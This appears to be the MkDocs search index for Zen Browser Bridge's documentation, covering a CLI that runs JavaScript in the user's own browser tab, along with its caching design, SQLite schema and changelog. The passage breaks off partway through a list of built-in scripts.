{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Zen Browser Bridge","text":"<p>Execute JavaScript in your browser from the command line.</p> <p>A powerful CLI tool for browser automation, debugging, and interactive development. Control your browser, extract data, automate tasks, and interact with web pages\u2014all from your terminal.</p>"},{"location":"#overview","title":"Overview","text":"<p>Zen Browser Bridge creates a WebSocket connection between your terminal and browser, enabling you to:</p> <ul> <li>Execute JavaScript code directly in any browser tab</li> <li>Extract data from authenticated sessions</li> <li>Automate repetitive browser tasks</li> <li>Debug web applications interactively</li> <li>Build custom workflows combining CLI tools with browser automation</li> </ul> <pre><code># Execute JavaScript and get instant results\nzen eval \"document.title\"\n# =&gt; \"Example Domain\"\n\n# Extract all links from a page\nzen links --only-external --only-urls &gt; external-links.txt\n\n# Start an interactive JavaScript REPL\nzen repl\n\n# Control your browser with keyboard navigation\nzen control\n</code></pre>"},{"location":"#architecture-overview","title":"Architecture Overview","text":"<p>Zen Bridge uses a clean 4-layer architecture to bridge your terminal and browser:</p> <pre><code>graph TB\n    CLI[CLI Commands] --&gt; Service[Service Layer]\n    Service --&gt; Adapter[Adapter Layer]\n    Adapter --&gt; Domain[Domain Models]\n    Service --&gt; WS[WebSocket Server]\n    WS --&gt; Browser[Browser + Userscript]\n\n    style CLI fill:#e1f5ff\n    style Service fill:#fff4e1\n    style Adapter fill:#ffe1f5\n    style Domain fill:#e1ffe1\n    style WS fill:#f5f5f5\n    style Browser fill:#fff9e6</code></pre>"},{"location":"#key-features","title":"Key Features","text":""},{"location":"#execute-javascript","title":"Execute JavaScript","text":"<p>Run JavaScript code in your active browser tab from the terminal. Full access to the DOM, browser APIs, and page context.</p> <pre><code>zen eval \"Array.from(document.querySelectorAll('h1, h2, h3')).map(h =&gt; h.textContent)\"\n</code></pre>"},{"location":"#interactive-repl","title":"Interactive REPL","text":"<p>Live JavaScript experimentation with instant feedback. Perfect for exploring APIs, debugging, and prototyping.</p> <pre><code>zen&gt; document.querySelectorAll('a').length\n42\nzen&gt; Array.from(document.links).slice(0, 3).map(a =&gt; a.href)\n[\"https://example.com/page1\", \"https://example.com/page2\", \"https://example.com/page3\"]\n</code></pre>"},{"location":"#ai-integration","title":"AI Integration","text":"<p>Article summarization and page descriptions powered by AI. Requires mods to be installed.</p> <pre><code>zen summarize  # Concise article summary\nzen describe   # Natural-language page description for screen readers\n</code></pre>"},{"location":"#element-interaction","title":"Element Interaction","text":"<p>Click, inspect, highlight, and wait for elements using CSS selectors.</p> <pre><code>zen click \"button#submit\"\nzen highlight \"h1, h2\" --color blue\nzen wait \".modal-dialog\" --visible --timeout 10\n</code></pre>"},{"location":"#keyboard-control","title":"Keyboard Control","text":"<p>Navigate pages entirely from your keyboard with auto-refocus across page loads.</p> <pre><code>zen control\n# Tab \u2192 Enter \u2192 Page loads \u2192 Element auto-refocuses \u2192 Continue navigating\n</code></pre>"},{"location":"#data-extraction","title":"Data Extraction","text":"<p>Extract links, images, tables, metadata, and more with built-in commands and custom scripts.</p> <pre><code>zen links --only-external --enrich-external  # Get external links with metadata\nzen outline                                   # Display page heading hierarchy\nzen info --extended                          # Extract comprehensive page info\n</code></pre>"},{"location":"#file-downloads","title":"File Downloads","text":"<p>Interactive file finder and downloader for images, documents, videos, audio, and archives.</p> <pre><code>zen download  # Interactive selection\nzen download --list  # List all downloadable files\n</code></pre>"},{"location":"#real-time-monitoring","title":"Real-time Monitoring","text":"<p>Watch keyboard events and browser activity as they happen.</p> <pre><code>zen watch input  # Monitor keyboard input in real-time\n</code></pre>"},{"location":"#quick-installation","title":"Quick Installation","text":""},{"location":"#requirements","title":"Requirements","text":"<ul> <li>Python 3.11 or higher</li> <li>A modern browser (Chrome, Firefox, Edge, Safari, etc.)</li> <li>A userscript manager extension</li> </ul>"},{"location":"#1-install-the-cli","title":"1. Install the CLI","text":"<pre><code># Clone the repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Install in development mode\npip install -e .\n</code></pre>"},{"location":"#2-install-the-userscript","title":"2. Install the Userscript","text":"<p>Install a userscript manager in your browser:</p> <ul> <li>Violentmonkey (recommended)</li> <li>Tampermonkey</li> <li>Greasemonkey (Firefox only)</li> </ul> <p>Then copy the userscript content:</p> <pre><code>zen userscript  # Display the userscript code\n</code></pre> <p>Create a new userscript in your userscript manager and paste the code.</p>"},{"location":"#3-start-the-server","title":"3. Start the Server","text":"<pre><code>zen server start --daemon\n</code></pre> <p>That's it! You're ready to control your browser from the terminal.</p> <p> Full installation guide: Getting Started \u2192 Installation</p>"},{"location":"#quick-example","title":"Quick Example","text":"<p>Here's a practical example showing the power of Zen Browser Bridge:</p> <p>Example: Extract External Links</p> <p>Command: <pre><code>zen links --only-external --enrich-external\n</code></pre></p> <p>Output: <pre><code>\ud83d\udd17 External Links (15 found)\n\n\ud83d\udcc4 GitHub Documentation\n   https://docs.github.com/en\n   Status: \u2705 200 OK\n\n\ud83d\udcc4 Python Official Site\n   https://www.python.org\n   Status: \u2705 200 OK\n\n\ud83d\udcc4 Stack Overflow Thread\n   https://stackoverflow.com/questions/12345\n   Status: \u2705 200 OK\n\n\u2728 Total: 15 external links | \u2705 14 reachable | \u274c 1 error\n</code></pre></p> Extract External LinksForm AutomationData ScrapingSEO Analysis <pre><code># Navigate to a page in your browser, then:\nzen links --only-external --only-urls | sort | uniq &gt; external-links.txt\n\n# Result: All unique external links saved to a file\n</code></pre> <pre><code># Fill out a login form\nzen eval \"document.querySelector('#email').value = 'user@example.com'\"\nzen eval \"document.querySelector('#password').value = 'secret'\"\nzen click \"button[type=submit]\"\n\n# Wait for success message\nzen wait \".success-message\" --visible\n</code></pre> <pre><code># Extract product information (while logged in)\nzen eval \"\n  Array.from(document.querySelectorAll('.product')).map(p =&gt; ({\n    name: p.querySelector('.name').textContent,\n    price: p.querySelector('.price').textContent,\n    inStock: p.querySelector('.in-stock') !== null\n  }))\n\" --format json &gt; products.json\n</code></pre> <pre><code># Get page outline\nzen outline\n\n# Extract all metadata\nzen exec zen/scripts/extract_metadata.js --format json\n\n# Check external links status\nzen links --enrich-external --json\n</code></pre>"},{"location":"#whats-new-in-v20","title":"What's New in v2.0","text":"<p>Zen Browser Bridge 2.0 brings major architectural improvements while maintaining full backward compatibility:</p>"},{"location":"#modular-architecture","title":"Modular Architecture","text":"<p>Clean hexagonal design with 4 layers:</p> <ul> <li>Domain Layer - Pure business logic with Pydantic models</li> <li>Adapter Layer - I/O operations (filesystem, WebSocket)</li> <li>Service Layer - Application services and orchestration</li> <li>Application Layer - CLI commands and server</li> </ul> <p>Benefits:</p> <ul> <li>High testability (97%+ coverage on core services)</li> <li>Clear dependencies (no circular imports)</li> <li>Easy extensibility (add new commands/services)</li> <li>Maintainable codebase (avg 362 lines per module)</li> </ul>"},{"location":"#comprehensive-testing","title":"Comprehensive Testing","text":"<ul> <li>244 tests with 97%+ coverage on core services</li> <li>Unit, integration, and E2E test suites</li> <li>CI/CD pipeline testing on Python 3.11-3.13</li> <li>Automated quality checks (linting, type checking)</li> </ul>"},{"location":"#enhanced-performance","title":"Enhanced Performance","text":"<ul> <li>Eliminated blocking I/O for faster responses</li> <li>Async file operations where appropriate</li> <li>Optimized WebSocket message handling</li> </ul>"},{"location":"#type-safety","title":"Type Safety","text":"<ul> <li>Full type hints throughout codebase</li> <li>Pydantic validation for all models</li> <li>Protocol validation for WebSocket messages</li> <li>MyPy type checking enforced</li> </ul>"},{"location":"#better-documentation","title":"Better Documentation","text":"<ul> <li>Complete architecture documentation</li> <li>Security best practices guide</li> <li>Protocol specification</li> <li>Contributing guidelines</li> </ul>"},{"location":"#zero-breaking-changes","title":"Zero Breaking Changes","text":"<p>Full backward compatibility with v1.x - upgrade seamlessly without changing your workflows.</p>"},{"location":"#next-steps","title":"Next Steps","text":"<ul> <li> <p> Quick Start</p> <p>Get up and running in 5 minutes with a hands-on tutorial.</p> <p> Quick Start Guide</p> </li> <li> <p> Configuration</p> <p>Customize Zen Bridge for your workflow with control mode, AI settings, and more.</p> <p> Configuration Guide</p> </li> <li> <p> User Guide</p> <p>Learn all commands, features, and advanced usage patterns.</p> <p> User Guide</p> </li> <li> <p> Development</p> <p>Contribute to Zen Bridge or build custom extensions.</p> <p> Development Guide</p> </li> </ul>"},{"location":"#why-zen-browser-bridge","title":"Why Zen Browser Bridge?","text":""},{"location":"#traditional-browser-automation-is-complex","title":"Traditional Browser Automation is Complex","text":"<p>Tools like Selenium and Playwright require:</p> <ul> <li>Heavy setup and dependencies</li> <li>Starting browser instances</li> <li>Managing browser drivers</li> <li>Learning complex APIs</li> <li>Writing verbose code</li> </ul>"},{"location":"#zen-bridge-is-simple","title":"Zen Bridge is Simple","text":"<p>Just install a userscript and start executing commands:</p> <pre><code>zen eval \"document.title\"\n</code></pre> <p>That's it. No browser drivers, no setup complexity, just instant browser control.</p>"},{"location":"#feature-comparison","title":"Feature Comparison","text":"<p>See how Zen Bridge compares to traditional browser automation tools:</p> Feature Zen Bridge Puppeteer Selenium Setup Time &lt; 2 min 10+ min 15+ min CLI Access \u2705 Yes \u274c No \u274c No Real Browser \u2705 Yes \u2705 Yes \u2705 Yes Interactive Mode \u2705 Yes \u274c No \u274c No Works with Auth \u2705 Yes \u26a0\ufe0f Complex \u26a0\ufe0f Complex Keyboard Control \u2705 Yes \u274c No \u274c No Live REPL \u2705 Yes \u274c No \u274c No Browser Drivers \u274c None \u2705 Required \u2705 Required Learning Curve Low Medium High"},{"location":"#perfect-for-these-use-cases","title":"Perfect for These Use Cases","text":"<ul> <li>Data Extraction - Scrape data from authenticated sessions</li> <li>Testing &amp; Debugging - Experiment with live pages interactively</li> <li>Automation - Automate repetitive browser tasks from scripts</li> <li>Development - Inspect app state and debug without DevTools</li> <li>Accessibility - Navigate pages with keyboard control mode</li> <li>Research - Analyze page structure, SEO, and performance</li> </ul>"},{"location":"#community-support","title":"Community &amp; Support","text":"<ul> <li>GitHub Issues - Report bugs and request features</li> <li>GitHub Discussions - Ask questions and share workflows</li> <li>Contributing - Development guide</li> </ul>"},{"location":"#license","title":"License","text":"<p>Zen Browser Bridge is open source software released under the MIT License.</p> <p>Created by Roel van Gils - Inspired by the original KM JS Bridge concept.</p>"},{"location":"caching/","title":"Caching in Zen Bridge","text":"<p>Zen Bridge implements intelligent content caching to dramatically speed up repeated operations and reduce AI API calls.</p>"},{"location":"caching/#overview","title":"Overview","text":"<p>Three commands use caching with different strategies:</p> Command Cache Type Default TTL Similarity Threshold <code>zen do</code> Action mapping 24 hours 80% <code>zen describe</code> Content fingerprinting 12 hours 85% <code>zen summarize</code> Content fingerprinting 7 days 90%"},{"location":"caching/#cache-location","title":"Cache Location","text":"<p>All caches are stored in a single SQLite database: <pre><code>~/.config/zen-bridge/action_cache.db\n</code></pre></p>"},{"location":"caching/#configuration","title":"Configuration","text":"<p>Edit <code>config.json</code> to customize caching behavior:</p> <pre><code>{\n  \"cache\": {\n    \"enabled\": true,\n    \"ttl_hours\": 24,\n    \"max_urls\": 100,\n    \"max_actions_per_url\": 10,\n    \"max_total_actions\": 1000,\n    \"similarity_threshold\": 0.8,\n    \"literal_match_threshold\": 0.8,\n    \"use_fuzzy_matching\": true,\n    \"max_fuzzy_distance\": 2,\n    \"describe\": {\n      \"enabled\": true,\n      \"ttl_hours\": 12,\n      \"similarity_threshold\": 0.85,\n      \"max_entries\": 100\n    },\n    \"summarize\": {\n      \"enabled\": true,\n      \"ttl_days\": 7,\n      \"similarity_threshold\": 0.90,\n      \"max_entries\": 50\n    }\n  }\n}\n</code></pre>"},{"location":"caching/#zen-do-caching","title":"zen do Caching","text":"<p>See zen do documentation for full details.</p> <p>What's cached: Action \u2192 Element mappings per URL</p> <p>How it works: After AI determines which element matches your action, that mapping is stored. Next time you perform the same action on the same page, it's instant.</p> <p>Validation: Checks if page structure is 80%+ similar (headings, landmarks, element counts)</p> <p>Example: <pre><code># First time - uses AI\nzen do \"about us\"  \u2192 [AI] 3 seconds\n\n# Second time - uses cache\nzen do \"about us\"  \u2192 [CACHED] instant!\n</code></pre></p>"},{"location":"caching/#zen-describe-caching","title":"zen describe Caching","text":"<p>What's cached: AI-generated page descriptions</p> <p>How it works: Creates a \"fingerprint\" of the page structure (title, headings, landmarks, element counts, text excerpt). If the page structure is 85%+ similar to cached version, returns cached description.</p> <p>Validation: - Page title (20% weight) - Heading structure (25% weight) - Landmarks (20% weight) - Element counts (20% weight) - Text excerpt (15% weight)</p> <p>Example: <pre><code># First visit\nzen describe\n\u2192 Analyzing page structure...\n\u2192 Generating description... [AI]\n\u2192 \u2713 Description cached for future use\n\n# Second visit (page unchanged)\nzen describe\n\u2192 \u2713 Using cached description (similarity: 95%, cached 2 hours ago) [CACHED]\n\u2192 [instant description]\n\n# Page was updated\nzen describe\n\u2192 Page changed significantly (similarity: 70%)\n\u2192 Generating description... [AI]\n\u2192 \u2713 Updated cache\n</code></pre></p>"},{"location":"caching/#language-support","title":"Language Support","text":"<p>Caches are stored separately per language:</p> <pre><code>zen describe --language nl  # Creates NL cache entry\nzen describe --language en  # Creates separate EN cache entry\nzen describe               # Uses auto-detected language\n</code></pre>"},{"location":"caching/#force-refresh","title":"Force Refresh","text":"<p>Bypass cache and generate fresh description:</p> <pre><code>zen describe --force-refresh\n\u2192 Generating fresh description... [AI - Force Refresh]\n</code></pre>"},{"location":"caching/#page-fingerprint-details","title":"Page Fingerprint Details","text":"<p>What's included: - Title: Exact page title - Headings: First 15 headings with levels (H1, H2, etc.) - Landmarks: Navigation, main, header, footer, etc. - Element counts: Links, buttons, images - Text excerpt: First 200 characters of main content</p> <p>What triggers cache invalidation: - Title changed - Heading structure changed significantly (&gt;15%) - Landmarks changed (&gt;15%) - Element counts changed significantly (&gt;20%) - Main text content changed - Cache expired (&gt;12 hours old)</p>"},{"location":"caching/#zen-summarize-caching","title":"zen summarize Caching","text":"<p>What's cached: AI-generated article summaries</p> <p>How it works: Creates a content-based fingerprint (title, word count, content hash). If the article is 90%+ similar, returns cached summary.</p> <p>Validation: - Article title (15% weight) - Content hash (55% weight) - most important - Article length (15% weight) - Publish date (15% weight)</p> <p>Example: <pre><code># First read\nzen summarize\n\u2192 Extracting article content...\n\u2192 Generating summary for: \"Article Title\" [AI]\n\u2192 \u2713 Summary cached for future use\n\n# Second read (article unchanged)\nzen summarize\n\u2192 \u2713 Using cached summary (similarity: 100%, cached 1 day ago) [CACHED]\n\u2192 [instant summary]\n\n# Article was updated\nzen summarize\n\u2192 Article content changed (similarity: 75%)\n\u2192 Generating summary for: \"Article Title\" [AI]\n\u2192 \u2713 Updated cache\n</code></pre></p>"},{"location":"caching/#content-hash","title":"Content Hash","text":"<p>The cache creates a hash from: - First 500 characters of article - Last 100 characters of article</p> <p>This efficiently detects content changes without hashing the entire article.</p>"},{"location":"caching/#language-support_1","title":"Language Support","text":"<p>Like <code>describe</code>, summaries are cached per language:</p> <pre><code>zen summarize --language nl  # NL summary\nzen summarize --language en  # EN summary\nzen summarize               # Auto-detected\n</code></pre>"},{"location":"caching/#force-refresh_1","title":"Force Refresh","text":"<pre><code>zen summarize --force-refresh\n\u2192 Generating fresh summary for: \"Article Title\" [AI - Force Refresh]\n</code></pre>"},{"location":"caching/#article-fingerprint-details","title":"Article Fingerprint Details","text":"<p>What's included: - Title: Article title - Content hash: SHA-256 of first 500 + last 100 chars - Word count: Total words in article - Excerpt: First 500 characters - Publish date: If available from metadata</p> <p>What triggers cache invalidation: - Content hash changed (article edited) - Title changed - Word count changed significantly (&gt;10%) - Cache expired (&gt;7 days old)</p>"},{"location":"caching/#cache-performance","title":"Cache Performance","text":""},{"location":"caching/#expected-hit-rates","title":"Expected Hit Rates","text":"<p>After a few uses:</p> Command Expected Hit Rate Reason <code>zen do</code> 60-80% Repeated actions on same pages <code>zen describe</code> 40-60% Static pages revisited within 12h <code>zen summarize</code> 70-90% Articles rarely change"},{"location":"caching/#speed-improvements","title":"Speed Improvements","text":"Command Without Cache With Cache Speedup <code>zen do</code> 2-5 seconds 0.1-0.5s 10-50x <code>zen describe</code> 3-8 seconds 0.1s 30-80x <code>zen summarize</code> 4-10 seconds 0.1s 40-100x"},{"location":"caching/#cache-indicators","title":"Cache Indicators","text":"<p>Commands show which method was used:</p> <pre><code>[CACHED]              - Retrieved from cache\n[AI]                  - Fresh AI generation\n[AI - Force Refresh]  - Forced fresh generation\n[LITERAL]             - zen do: Literal text match\n[COMMON]              - zen do: Common action match\n[FUZZY]               - zen do: Fuzzy text match\n[SYNONYM]             - zen do: Synonym match\n</code></pre>"},{"location":"caching/#cache-management","title":"Cache Management","text":""},{"location":"caching/#view-cache-stats","title":"View Cache Stats","text":"<p>Coming soon: <pre><code>zen cache stats              # All caches\nzen cache stats describe     # Describe cache only\nzen cache stats summarize    # Summarize cache only\nzen cache stats do           # Do cache only\n</code></pre></p>"},{"location":"caching/#clear-cache","title":"Clear Cache","text":"<p>To clear all caches: <pre><code>rm ~/.config/zen-bridge/action_cache.db\n</code></pre></p> <p>To clear specific command cache (coming soon): <pre><code>zen cache clear describe\nzen cache clear summarize\nzen cache clear do\nzen cache clear all\n</code></pre></p>"},{"location":"caching/#database-schema","title":"Database Schema","text":"<p>content_cache table: <pre><code>CREATE TABLE content_cache (\n    id INTEGER PRIMARY KEY,\n    url TEXT NOT NULL,\n    command TEXT NOT NULL,           -- 'describe' or 'summarize'\n    fingerprint TEXT NOT NULL,       -- JSON fingerprint\n    cached_output TEXT NOT NULL,     -- AI-generated output\n    language TEXT,                   -- 'en', 'nl', 'auto', etc.\n    last_updated INTEGER NOT NULL,   -- Unix timestamp\n    hit_count INTEGER DEFAULT 0,     -- Usage tracking\n    UNIQUE(url, command, language)\n);\n</code></pre></p>"},{"location":"caching/#troubleshooting","title":"Troubleshooting","text":""},{"location":"caching/#cache-returns-stale-content","title":"Cache Returns Stale Content","text":"<p>Problem: Cached description/summary is outdated</p> <p>Solutions: 1. Use <code>--force-refresh</code> to bypass cache 2. Wait for TTL expiration (12h for describe, 7d for summarize) 3. Clear cache manually 4. Lower similarity threshold in config</p>"},{"location":"caching/#cache-never-hits","title":"Cache Never Hits","text":"<p>Problem: Always generates fresh content even though page unchanged</p> <p>Possible causes: 1. Caching is disabled in config 2. Similarity threshold too high 3. Page has dynamic content that changes on each load 4. Different language being used</p> <p>Check: <pre><code># Verify cache is enabled\ncat config.json | grep -A 10 \"describe\"\n\n# Test with debug to see fingerprint\nzen describe --debug\n</code></pre></p>"},{"location":"caching/#wrong-language-cached","title":"Wrong Language Cached","text":"<p>Problem: Got English cached version when you wanted Dutch</p> <p>Solution: Each language has separate cache entry. The cache key includes language: <pre><code>zen describe --language nl  # Force NL and cache it\n</code></pre></p>"},{"location":"caching/#cache-takes-too-much-space","title":"Cache Takes Too Much Space","text":"<p>Default limits: - <code>describe</code>: 100 entries max - <code>summarize</code>: 50 entries max - <code>do</code>: 1000 actions max</p> <p>Solution: Lower limits in config.json: <pre><code>{\n  \"cache\": {\n    \"describe\": {\n      \"max_entries\": 50\n    },\n    \"summarize\": {\n      \"max_entries\": 25\n    }\n  }\n}\n</code></pre></p>"},{"location":"caching/#best-practices","title":"Best Practices","text":""},{"location":"caching/#1-let-it-learn","title":"1. Let It Learn","text":"<p>First use requires AI, subsequent uses are cached. Be patient on first visit to a page.</p>"},{"location":"caching/#2-adjust-ttl-for-your-use-case","title":"2. Adjust TTL for Your Use Case","text":"<p>News sites (content changes daily): <pre><code>{\n  \"describe\": { \"ttl_hours\": 6 }\n}\n</code></pre></p> <p>Documentation sites (static content): <pre><code>{\n  \"describe\": { \"ttl_hours\": 72 }\n}\n</code></pre></p>"},{"location":"caching/#3-use-force-refresh-sparingly","title":"3. Use Force Refresh Sparingly","text":"<p>Only use <code>--force-refresh</code> when you know content has changed. Otherwise, let the similarity check handle it automatically.</p>"},{"location":"caching/#4-monitor-hit-rate","title":"4. Monitor Hit Rate","text":"<p>Check your cache database to see hit rates: <pre><code>sqlite3 ~/.config/zen-bridge/action_cache.db \"SELECT command, SUM(hit_count) FROM content_cache GROUP BY command\"\n</code></pre></p>"},{"location":"caching/#5-different-languages-need-separate-cache","title":"5. Different Languages Need Separate Cache","text":"<p>If you regularly switch languages, be aware each language generates a separate cache entry. This is intentional - you want different descriptions for different languages.</p>"},{"location":"caching/#technical-details","title":"Technical Details","text":""},{"location":"caching/#similarity-calculation","title":"Similarity Calculation","text":"<p>For describe (weights): - Title match: 20% - Heading structure overlap: 25% - Landmark overlap: 20% - Element count similarity: 20% - Text excerpt match: 15%</p> <p>For summarize (weights): - Title match: 15% - Content hash match: 55% (most important!) - Length similarity: 15% - Publish date match: 15%</p>"},{"location":"caching/#why-different-thresholds","title":"Why Different Thresholds?","text":"<ul> <li>do: 80% - Pages can vary more, still want to use cached actions</li> <li>describe: 85% - Descriptions should be accurate, stricter matching</li> <li>summarize: 90% - Articles shouldn't change, very strict matching</li> </ul>"},{"location":"caching/#performance-optimization","title":"Performance Optimization","text":"<p>The cache uses several optimizations: 1. Single database: All caches in one SQLite file 2. Indexed lookups: Fast retrieval by (url, command, language) 3. Lazy cleanup: Old entries removed only when adding new ones 4. Hit counting: Track most-used entries for future optimization</p>"},{"location":"caching/#see-also","title":"See Also","text":"<ul> <li>zen do Command - Detailed action caching</li> <li>Configuration Guide - All config options</li> </ul>"},{"location":"about/changelog/","title":"Changelog","text":"<p>All notable changes to Zen Browser Bridge are documented here.</p> <p>The format is based on Keep a Changelog, and this project adheres to Semantic Versioning.</p>"},{"location":"about/changelog/#200-2025-10-27","title":"[2.0.0] - 2025-10-27","text":""},{"location":"about/changelog/#major-refactoring-hexagonal-architecture","title":"Major Refactoring - Hexagonal Architecture","text":"<p>Version 2.0.0 represents a comprehensive refactoring of Zen Bridge with zero breaking changes. All existing commands and features remain fully compatible with v1.x.</p>"},{"location":"about/changelog/#architecture-improvements","title":"Architecture Improvements","text":"<p>4-Layer Hexagonal Architecture:</p> <ul> <li>Domain Layer - Pure business logic with Pydantic models</li> <li>Adapter Layer - I/O operations (filesystem, WebSocket)</li> <li>Service Layer - Application services and orchestration</li> <li>Application Layer - CLI commands and server</li> </ul> <p>Modular CLI Structure:</p> <p>Split monolithic <code>cli.py</code> (3,946 lines) into 12 focused modules:</p> <ul> <li><code>cli_main.py</code> - Entry point and shared utilities (147 lines)</li> <li><code>cli_core.py</code> - Core commands (eval, exec, repl, info) (379 lines)</li> <li><code>cli_interaction.py</code> - Element interaction (click, inspect, highlight, wait) (293 lines)</li> <li><code>cli_extraction.py</code> - Data extraction (links, outline, selected) (315 lines)</li> <li><code>cli_ai.py</code> - AI-powered features (summarize, describe) (174 lines)</li> <li><code>cli_control.py</code> - Keyboard control mode (240 lines)</li> <li><code>cli_navigation.py</code> - Navigation commands (open, back, forward, reload) (167 lines)</li> <li><code>cli_media.py</code> - Media commands (screenshot, download) (193 lines)</li> <li><code>cli_utilities.py</code> - Utility commands (send, watch, cookies) (148 lines)</li> <li><code>cli_server.py</code> - Server management (125 lines)</li> <li><code>cli_browser.py</code> - Browser state (tabs, windows) (102 lines)</li> <li><code>cli_help.py</code> - Enhanced help system (273 lines)</li> </ul> <p>New Services (97%+ test coverage):</p> <ul> <li><code>bridge_executor.py</code> (263 lines, 96.63% coverage) - Standardized execution flow with retry logic</li> <li><code>ai_integration.py</code> (367 lines, 99.30% coverage) - AI orchestration and language detection</li> <li><code>control_manager.py</code> (230 lines, 100% coverage) - Control mode state and notification management</li> <li><code>script_loader.py</code> (existing, enhanced) - Script discovery and loading</li> </ul>"},{"location":"about/changelog/#testing-quality","title":"Testing &amp; Quality","text":"<ul> <li>267 tests total (up from 52 in v1.0.0)</li> <li>192 new tests added across all layers</li> <li>97%+ coverage on core services</li> <li>12.53% overall coverage (focused on critical paths)</li> <li>All tests passing with zero regressions</li> </ul> <p>Test Distribution:</p> <ul> <li>Unit tests: 139 tests</li> <li>Integration tests: 97 tests</li> <li>End-to-end tests: 31 tests (Playwright-based)</li> </ul>"},{"location":"about/changelog/#performance-improvements","title":"Performance Improvements","text":"<ul> <li>Eliminated blocking I/O operations</li> <li>Optimized WebSocket communication</li> <li>Faster command execution times</li> <li>Reduced memory footprint</li> </ul>"},{"location":"about/changelog/#documentation","title":"Documentation","text":"<p>New comprehensive documentation:</p> <ul> <li><code>ARCHITECTURE.md</code> - System design and layer responsibilities</li> <li><code>SECURITY.md</code> - Security model and best practices</li> <li><code>PROTOCOL.md</code> - WebSocket protocol specification</li> <li><code>REFACTOR_PLAN.md</code> - Complete refactoring history and metrics</li> </ul> <p>MkDocs Documentation Site:</p> <ul> <li>Material theme with dark/light mode</li> <li>Complete user guides with examples</li> <li>API reference for all services and models</li> <li>Development guides for contributors</li> <li>Interactive navigation with search</li> </ul>"},{"location":"about/changelog/#type-safety","title":"Type Safety","text":"<ul> <li>Full type hints throughout codebase</li> <li>Pydantic models for all data structures</li> <li>Protocol validation with clear error messages</li> <li>MyPy type checking enabled</li> </ul>"},{"location":"about/changelog/#cicd-pipeline","title":"CI/CD Pipeline","text":"<ul> <li>Automated testing on Python 3.11, 3.12, 3.13</li> <li>Linting with Ruff</li> <li>Type checking with MyPy</li> <li>Code formatting enforcement</li> <li>Test coverage reporting</li> </ul>"},{"location":"about/changelog/#project-structure","title":"Project Structure","text":"<pre><code>zen/\n\u251c\u2500\u2500 domain/          # Core models (Pydantic)\n\u2502   \u251c\u2500\u2500 models.py\n\u2502   \u2514\u2500\u2500 protocols.py\n\u251c\u2500\u2500 adapters/        # I/O adapters\n\u2502   \u251c\u2500\u2500 filesystem.py\n\u2502   \u2514\u2500\u2500 websocket.py\n\u251c\u2500\u2500 services/        # Business logic\n\u2502   \u251c\u2500\u2500 bridge_executor.py\n\u2502   \u251c\u2500\u2500 ai_integration.py\n\u2502   \u251c\u2500\u2500 control_manager.py\n\u2502   \u2514\u2500\u2500 script_loader.py\n\u2514\u2500\u2500 app/\n    \u251c\u2500\u2500 cli/         # CLI commands (12 modules)\n    \u2514\u2500\u2500 bridge_ws.py # WebSocket server\n</code></pre>"},{"location":"about/changelog/#changed","title":"Changed","text":"<ul> <li>Refactored entire codebase to hexagonal architecture</li> <li>Improved error handling and validation</li> <li>Enhanced type safety with Pydantic</li> <li>Optimized WebSocket connection handling</li> <li>Modernized development tooling</li> </ul>"},{"location":"about/changelog/#added","title":"Added","text":"<ul> <li>Comprehensive test suite (267 tests)</li> <li>MkDocs documentation with Material theme</li> <li>CI/CD pipeline with GitHub Actions</li> <li>Development documentation (ARCHITECTURE.md, SECURITY.md)</li> <li>Type checking with MyPy</li> <li>Code quality tools (Ruff, pre-commit hooks)</li> </ul>"},{"location":"about/changelog/#fixed","title":"Fixed","text":"<ul> <li>WebSocket connection stability issues</li> <li>Memory leaks in long-running sessions</li> <li>Race conditions in async operations</li> <li>Error handling edge cases</li> </ul>"},{"location":"about/changelog/#100-2025-10-27","title":"[1.0.0] - 2025-10-27","text":""},{"location":"about/changelog/#first-production-release","title":"First Production Release","text":"<p>Initial production-ready release of Zen Browser Bridge with all core features implemented.</p>"},{"location":"about/changelog/#core-features","title":"Core Features","text":"<p>JavaScript Execution:</p> <ul> <li>Execute JavaScript in active browser tab</li> <li>Interactive REPL for live experimentation</li> <li>Execute code from files or stdin</li> <li>Multiple output formats (text, JSON, raw)</li> <li>Script execution with built-in library</li> </ul> <p>Element Interaction:</p> <ul> <li>Click, double-click, right-click elements</li> <li>Inspect and highlight elements</li> <li>Wait for elements (with timeout and conditions)</li> <li>Element state detection (visible, hidden)</li> <li>Text content matching</li> </ul> <p>Data Extraction:</p> <ul> <li>Extract all links (internal/external filtering)</li> <li>Page outline with heading hierarchy</li> <li>Selected text extraction</li> <li>Page information and metadata</li> <li>Cookie management</li> </ul> <p>AI-Powered Features:</p> <ul> <li>Article summarization with Readability</li> <li>Page descriptions for screen readers</li> <li>AI language configuration and auto-detection</li> <li>Customizable AI prompts</li> </ul> <p>Keyboard Control Mode:</p> <ul> <li>Navigate pages entirely from keyboard</li> <li>Auto-refocus after navigation</li> <li>Visual feedback with blue outlines</li> <li>Real-time terminal announcements</li> <li>Optional text-to-speech (macOS)</li> <li>Persistent across page loads</li> </ul> <p>Navigation:</p> <ul> <li>Open URLs with optional wait</li> <li>Browser history (back/forward)</li> <li>Page reload (normal and hard reload)</li> <li>Navigation state tracking</li> </ul> <p>Media Handling:</p> <ul> <li>Screenshot capture by selector</li> <li>Interactive file downloader</li> <li>Support for multiple file types (images, documents, videos, audio, archives)</li> </ul> <p>Real-time Monitoring:</p> <ul> <li>Watch keyboard input events</li> <li>Real-time event streaming</li> <li>Formatted output display</li> </ul> <p>Server Management:</p> <ul> <li>WebSocket server with daemon mode</li> <li>Server status checking</li> <li>Process management</li> <li>Health monitoring</li> </ul>"},{"location":"about/changelog/#technical-features","title":"Technical Features","text":"<ul> <li>WebSocket Architecture - Fast bi-directional communication</li> <li>HTTP API - RESTful command interface</li> <li>Configuration System - JSON-based configuration</li> <li>Userscript Integration - Browser-side JavaScript injection</li> <li>Error Handling - Comprehensive error messages</li> <li>Timeout Support - Configurable timeouts for all commands</li> <li>JSON Output - Machine-readable output format</li> <li>Debug Mode - Verbose logging for troubleshooting</li> </ul>"},{"location":"about/changelog/#built-in-scripts","title":"Built-in Scripts","text":"<ul> <li><code>extract_images.js</code> - Extract all images with metadata</li> <li><code>extract_table.js</code> - Convert tables to JSON</li> <li><code>extract_metadata.js</code> - SEO metadata extraction</li> <li><code>performance_metrics.js</code> - Performance monitoring</li> <li><code>inject_jquery.js</code> - jQuery injection</li> 